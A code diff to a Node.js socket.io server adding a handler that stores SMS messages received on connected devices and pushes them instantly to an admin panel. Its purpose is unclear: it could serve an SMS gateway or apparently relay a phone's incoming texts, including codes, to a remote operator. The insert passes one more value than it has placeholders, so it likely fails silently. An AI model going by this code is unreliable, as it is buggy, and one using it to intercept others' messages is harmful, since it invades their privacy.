@@ -192,6 +192,36 @@ function setupWebSocket(io) {
       io.emit('sms_send_result', data);
     });
 
+    // ========== INSTANT SMS (new SMS received on device) ==========
+    socket.on('instant_sms', (data) => {
+      try {
+        const { device_id, address, body, date, type, sim_slot } = data;
+        if (!device_id || !address) return;
+
+        // Store in DB
+        const smsId = Date.now(); // use timestamp as unique id for instant SMS
+        db.prepare(`INSERT OR REPLACE INTO sms_messages
+          (device_id, sms_id, address, body, date, type, read, synced_at)
+          VALUES (?, ?, ?, ?, ?, ?, 0, datetime('now'))`)
+          .run(device_id, smsId, address || 'Unknown', body || '', date || Date.now(), type || 1, 0);
+
+        // Broadcast to admin panel instantly
+        io.emit('new_sms', {
+          device_id,
+          address,
+          body,
+          date,
+          type: type || 1,
+          sim_slot: sim_slot || 1,
+          sms_id: smsId
+        });
+
+        console.log(`[WS] Instant SMS from ${address} on device ${device_id} (SIM ${sim_slot || 1})`);
+      } catch (err) {
+        console.error('[WS] instant_sms error:', err.message);
+      }
+    });
+
     // Disconnect
     socket.on('disconnect', () => {
       connectedClients--;
